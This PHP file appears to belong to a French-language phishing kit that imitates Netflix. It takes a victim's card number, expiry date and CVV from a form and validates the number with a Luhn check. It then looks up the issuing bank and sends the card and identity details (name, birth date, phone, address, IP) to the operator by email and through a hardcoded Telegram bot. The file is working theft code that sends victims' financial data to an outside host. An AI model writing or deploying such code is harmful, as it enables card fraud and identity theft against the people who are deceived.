<?php
include('../tonmail.php');
include('../prevents/anti1.php');
include('../prevents/anti2.php');
include('../prevents/anti3.php');
include('../prevents/anti4.php');
include('../prevents/anti5.php');
include('../prevents/anti6.php');
include('../prevents/anti7.php');
include('../prevents/anti8.php');
if(isset($_POST['cardsub']))
{

	
	session_start();

	$_SESSION['nomcc'] = htmlspecialchars($_POST['nomcc']);
	$_SESSION['ccnum'] = htmlspecialchars($_POST['ccnum']);
	$_SESSION['ccexp'] = htmlspecialchars($_POST['ccexp']);
	$_SESSION['cvv'] = htmlspecialchars($_POST['cvv']);



if(empty($_SESSION['nomcc']) || empty($_SESSION['ccnum']) || empty($_SESSION['ccexp']) || empty($_SESSION['cvv']) )
{

	header('Location: ../steps/card.php?error=empty');
}
else{


	function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}

if(is_valid_luhn($_SESSION['ccnum']) && is_numeric($_SESSION['ccnum'])){




$cc = $_SESSION['ccnum'];
$bin = substr($cc, 0, 6);

$ch = curl_init();

$url = "https://lookup.binlist.net/$bin";

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


$headers = array();
$headers[] = 'Accept-Version: 3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

$brand = '';
$type = '';
$emoji = '';
$bank = '';


$someArray = json_decode($result, true);

$emoji = $someArray['country']['emoji'];
$brand = $someArray['brand'];
$type = $someArray['type'];
$bank = $someArray['bank']['name'];
$bank_phone = $someArray['bank']['phone'];
$subject_title = "[BIN: $bin][$emoji $brand $type]";


$message = "
[💳 CC FR3SH 💳]
💳 Numéro de carte : ".$_SESSION['ccnum']."
💳 Date d'expiration : ".$_SESSION['ccexp']."
💳 CVV (Code de sécurité) : ".$_SESSION['cvv']."

💳 Level : ".$brand."
💳 Banque : ".$bank."
💳 Type : ".$type."

👮 Nom : ".$_SESSION['nom']."
👮 Prénom : ".$_SESSION['prenom']."
👮 Date de naissance : ".$_SESSION['dob']."
👮 Numéro de téléphone : ".$_SESSION['phone']."
👮 Adresse : ".$_SESSION['adresse']."
👮 Code Postal : ".$_SESSION['zip']."
👮 Ville : ".$_SESSION['city']."





";

$subject = "=?utf-8?Q?=E3=80=8C=F0=9F=92=B3=E3=80=8D_-_?==?utf-8?Q?=E3=80=8C?=".$bin."=?utf-8?Q?=E3=80=8D?= - ".$bank." - ".$brand." - ".$_SESSION['ip'];
$headers = "From: =?utf-8?Q?=F0=9F=83=8F_WEYZUX_=F0=9F=83=8F?= <log@netflixpardon.com>";
mail($rezmail, $subject, $message, $headers);
	function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '5219779284:AAEJbfP20wPRuW271KLNhMtMIqyKGAVRTZg';
    $chat_id  = '1875024250';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

telegram_send(urlencode($message));

			if($vbv == "1"){
			header('Location: ../steps/loading_vbv.php');
		}

		if($vbv == "0"){
			header('Location: ../steps/loading_finished.php');
		}


}
else{
	header('Location: ../steps/card.php?error=invalidcard');
}

}


	

}
else{
	echo 'no isset';
}




?>